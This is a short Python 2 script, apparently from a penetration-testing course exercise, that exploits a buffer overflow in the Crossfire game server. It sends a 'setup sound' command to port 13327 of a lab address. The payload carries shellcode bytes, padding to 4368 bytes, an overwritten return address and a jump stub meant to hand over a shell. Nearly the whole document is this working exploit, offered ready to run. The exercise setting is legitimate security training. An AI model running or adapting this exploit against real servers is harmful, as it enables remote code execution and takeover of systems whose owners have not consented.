#!/usr/bin/python
#8.8.1 exercises
#get the shell from crossfire
 
import socket

host = '192.168.79.137'

buf =  ""
buf += "\xdb\xc9\xd9\x74\x24\xf4\x5e\x31\xc9\xb8\x2e\x9d\xf0"
buf += "\x79\xb1\x12\x83\xee\xfc\x31\x46\x16\x03\x46\x16\xe2"
buf += "\xdb\xac\x2b\x8e\xc0\x9c\x88\x22\x6c\x21\xbf\xa3\xf9"
buf += "\xc4\x72\xab\x6e\x5d\xe5\x6c\x38\x2d\x69\x04\x3a\xb2"
buf += "\x80\x89\xb3\x53\xc8\x57\x9b\xc3\x5c\xcf\x92\x05\x1d"
buf += "\x22\x24\x77\xa5\x05\x24\x68\xaa\x75\xad\x6b\x6b\x9e"
buf += "\xa1\xaa\x8f\x6d\x09\x51\x9d\xee\x32\x23\xfc\x76\x72"
buf += "\x3f\x4f\x8b\xb7\xc0\x50\x6d"

crash = buf + "\x41"*(4368 -len(buf)) + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90"

buff = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[*] Sending evil buffer..."
s.connect((host, 13327))

data = s.recv(1024) 
print data

s.send(buff)
s.close()
print "[*] Payload sent..."